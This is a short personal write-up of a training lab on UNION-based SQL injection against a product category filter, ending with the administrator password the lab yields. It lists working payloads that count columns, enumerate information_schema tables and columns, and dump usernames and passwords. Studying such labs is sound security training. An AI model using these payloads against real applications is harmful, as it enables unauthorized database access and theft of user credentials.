# Sixth Lab: SQL Injection

Lab - 06 : SQL injection attack, listing the database contents on non-Oracle databases

SQL Injection : product category filter

Endgoal : Logging in as administrator

Analysis : 

1. SQl injection issues using ‘ → True
2. To output data from the database.
    1. Determine the number of columns
        
        ```
        Payload -> ' order by 1--
        ```
        
        ![vmplayer_jJaE2gV16S.png](Sixth%20Lab%20SQL%20Injection%2021a3c5d54c7680f1b479f488a40b9b40/vmplayer_jJaE2gV16S.png)
        
        No of columns found = 2;
        
    2. To list the contents of the database 
        
        ```
        Payload -> ' UNION SELECT table_name, NULL FROM information_schema.tables--
        ```
        
    3. Finding the columns in the table 
        
        ```
        Payload -> ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_qjtnmb'--
        ```
        
    4. Finding the usernames and password
        
        ```
        Payload -> ' UNION SELECT username_wadvzm, password_xvvbgz FROM users_qjtnmb--
        ```
        
        ![vmplayer_w225oeG6bo.png](Sixth%20Lab%20SQL%20Injection%2021a3c5d54c7680f1b479f488a40b9b40/vmplayer_w225oeG6bo.png)
        

The joy after finally getting the password is immense → kljnxza7wiv9rxbko080